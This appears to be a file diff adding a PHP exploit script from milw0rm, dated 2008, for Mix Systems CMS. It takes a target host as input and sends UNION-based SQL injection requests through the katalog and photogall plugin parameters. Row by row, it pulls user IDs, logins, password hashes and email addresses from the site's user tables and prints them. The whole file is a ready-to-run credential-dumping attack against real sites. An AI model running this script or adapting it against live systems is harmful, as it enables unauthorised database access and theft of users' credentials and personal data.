@@ -1,0 +1,66 @@
+<?
+echo "\n";
+echo "-------------------------Mix Systems CMS--------------------------"."\n";
+echo "-----------------------coded by : halkfild------------------------"."\n";
+echo "----------------------------antichat.ru------------------------"."\n";
+
+if ($argc!=4){
+echo " Usage: php ".$argv[0]." host type num_records\n";
+echo " host: Your target ex www.target.com \n";
+echo " type: 1 - plugin=katalog bug\n";
+echo " 2 - plugin=photogall bug\n";
+echo " num_records: number or returned records(if 0 - return all)\n";
+echo " example: php script.php site.com 10\n";
+echo "\n";
+exit;
+}
+
+$host=$argv[1];
+$type=$argv[2];
+$count=$argv[3];
+
+if ($argv[2]==1) {
+$query="index.php?plugin=katalog&do=showUserContent&type=tovars&id=-395'+union+select+1,2,3,4,5,concat_ws(0x3a3a,CHAR(64),id,login,pwd,email,CHAR(64)),7,8,9,10,11,12,13,14,15,16,17,18+from+mix_users+limit+";
+$end=",1/*";
+}
+elseif ($argv[2]==2) {
+$query="index.php?plugin=photogall&do=exposure&path=product&parent=49'+union+select+1,2,3,concat_ws(0x3a3a,CHAR(64),id,login,pwd,email,CHAR(64)),5,6,7,8,9,10,11,12+from+ng_users+limit+";
+$end=",1/*&cat=11";
+}
+else {
+echo " incorrect parameter #2=".$argv[2]."\n";
+echo " type: 1 - plugin=katalog bug\n";
+echo " 2 - plugin=photogall bug\n";
+exit;
+}
+$site=$host.'/'.$query;
+$pattern='/@::(\d+)::(.*)::([0-9a-z]{32})::(.*@.*)::@/';
+$i=0;
+if(function_exists('curl_init'))
+{
+while(1) {
+$ch = curl_init("http://".$site.$i.$end);
+curl_setopt($ch, CURLOPT_HEADER,true);
+curl_setopt( $ch, CURLOPT_RETURNTRANSFER,true);
+curl_setopt($ch, CURLOPT_TIMEOUT,10);
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)");
+$res=curl_exec($ch);
+$returncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
+curl_close($ch);
+if ($returncode==404) exit ("Vulnerable script not found. Check your site and settings :| \n");
+if(preg_match_all($pattern,$res,$out)) {
+echo "| ".$out[1][0]." | ".$out[2][0]." | ".$out[3][0]." | ".$out[4][0]." |\r\n";
+$i++;
+$out=null;
+}
+else break;
+if ($count!=0 && $i>$count) break;
+}
+echo ("Finish. /* ".$i." records*/ \n");
+}
+else
+exit("Error:Libcurl isnt installed \n");
+
+?>
+
+# milw0rm.com [2008-02-10]
